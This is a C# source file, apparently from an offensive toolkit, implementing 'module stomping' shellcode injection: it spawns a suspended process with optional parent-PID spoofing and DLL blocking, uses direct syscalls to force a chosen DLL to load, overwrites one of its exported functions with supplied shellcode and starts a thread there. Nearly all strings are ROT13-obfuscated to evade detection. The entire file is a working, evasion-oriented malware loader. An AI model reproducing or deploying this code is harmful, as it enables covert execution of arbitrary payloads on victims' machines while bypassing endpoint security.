//start
using System.Text;
using System.Linq;
using System;
﻿
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    public class ModuleStomping
    {
        static byte[] GenerateShim(long loadLibraryExP)
        {
            using var ms = new MemoryStream();
            using var bw = new BinaryWriter(ms);

            bw.Write((ulong)loadLibraryExP);
            var loadLibraryExBytes = ms.ToArray();

            return new byte[] {
                0x48, 0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3], loadLibraryExBytes[4], loadLibraryExBytes[5], loadLibraryExBytes[6],loadLibraryExBytes[7],
                0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
                0x48, 0x31, 0xD2,
                0xFF, 0xE0
            };
        }

        public static void Execute(byte[] shellcode, string processImage, string moduleName, string exportName, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                new string(@"P:\Jvaqbjf\Flfgrz32".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            #endregion

            #region GenerateShim

            var kernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry(new string("xreary32.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            var loadLibraryEx = DI.DynamicInvoke.Generic.GetExportAddress(kernel32, new string("YbnqYvoenelRkN".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

            var shim = GenerateShim((long)loadLibraryEx);
            var bModuleName = Encoding.ASCII.GetBytes(moduleName);

            #endregion

            #region NtAllocateVirtualMemory (bModuleNameLength, PAGE_READWRITE)

            IntPtr hProcess = pi.hProcess;
            var allocModule = IntPtr.Zero;
            var regionSize = new IntPtr(bModuleName.Length + 2);

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref allocModule,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgNyybpngrIveghnyZrzbel (oZbqhyrAnzrYratgu), CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (bModuleNameLength), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtAllocateVirtualMemory (shimLength, PAGE_READWRITE)

            var allocShim = IntPtr.Zero;
            regionSize = new IntPtr(shim.Length);

            ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref allocShim,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgNyybpngrIveghnyZrzbel (fuvzYratgu), CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtAllocateVirtualMemory (shimLength), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (bModuleName)

            var buffer = Marshal.AllocHGlobal(bModuleName.Length);
            Marshal.Copy(bModuleName, 0, buffer, bModuleName.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                allocModule,
                buffer,
                (uint)bModuleName.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgJevgrIveghnyZrzbel (oZbqhyrAnzr)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtWriteVirtualMemory (bModuleName): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtWriteVirtualMemory (shim)

            buffer = Marshal.AllocHGlobal(shim.Length);
            Marshal.Copy(shim, 0, buffer, shim.Length);

            bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                allocShim,
                buffer,
                (uint)shim.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgJevgrIveghnyZrzbel (fuvz)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtWriteVirtualMemory (shim): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (shim, PAGE_EXECUTE_READ)

            IntPtr protectAddress = allocShim;
            regionSize = new IntPtr(shim.Length);
            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgCebgrpgIveghnyZrzbel (fuvz), CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtProtectVirtualMemory (shim), PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (shim)

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                allocShim,
                allocModule,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgPerngrGuernqRk (fuvz)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtCreateThreadEx (shim): {ntstatus}");

            #endregion

            #region NtWaitForSingleObject

            ntstatus = Syscalls.NtWaitForSingleObject(
                hThread,
                false,
                0);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgJnvgSbeFvatyrBowrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtWaitForSingleObject: {ntstatus}");

            #endregion

            #region NtFreeVirtualMemory (allocModule)

            regionSize = new IntPtr(bModuleName.Length + 2);

            ntstatus = Syscalls.NtFreeVirtualMemory(
                hProcess,
                ref allocModule,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgSerrIveghnyZrzbel (nyybpZbqhyr)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtFreeVirtualMemory (allocModule): {ntstatus}");

            #endregion

            #region NtFreeVirtualMemory (allocShim)

            regionSize = new IntPtr(shim.Length);

            ntstatus = Syscalls.NtFreeVirtualMemory(
                hProcess,
                ref allocShim,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgSerrIveghnyZrzbel (nyybpFuvz)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtFreeVirtualMemory (allocShim): {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);

            #region Find targetAddress

            var hModule = DI.DynamicInvoke.Generic.LoadModuleFromDisk(moduleName);
            var export = DI.DynamicInvoke.Generic.GetExportAddress(hModule, exportName);
            var offset = (long)export - (long)hModule;

            var targetAddress = IntPtr.Zero;
            using var process = Process.GetProcessById((int)pi.dwProcessId);

            foreach (ProcessModule module in process.Modules)
            {
                if (!module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase)) continue;

                targetAddress = new IntPtr((long)module.BaseAddress + offset);
                break;
            }

            #endregion

            #region NtProtectVirtualMemory (shellcode, PAGE_READWRITE)

            protectAddress = targetAddress;
            regionSize = new IntPtr(shellcode.Length);
            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgCebgrpgIveghnyZrzbel (furyypbqr), CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtProtectVirtualMemory (shellcode), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                targetAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgJevgrIveghnyZrzbel (furyypbqr)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtWriteVirtualMemory (shellcode): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (shellcode, PAGE_EXECUTE_READ)

            protectAddress = targetAddress;
            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgCebgrpgIveghnyZrzbel (furyypbqr), CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtProtectVirtualMemory (shellcode), PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (shellcode)

            hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                targetAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ZbqhyrFgbzcvat) [+] AgPerngrGuernqRk (furyypbqr)".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(ModuleStomping) [-] NtCreateThreadEx (shellcode): {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}
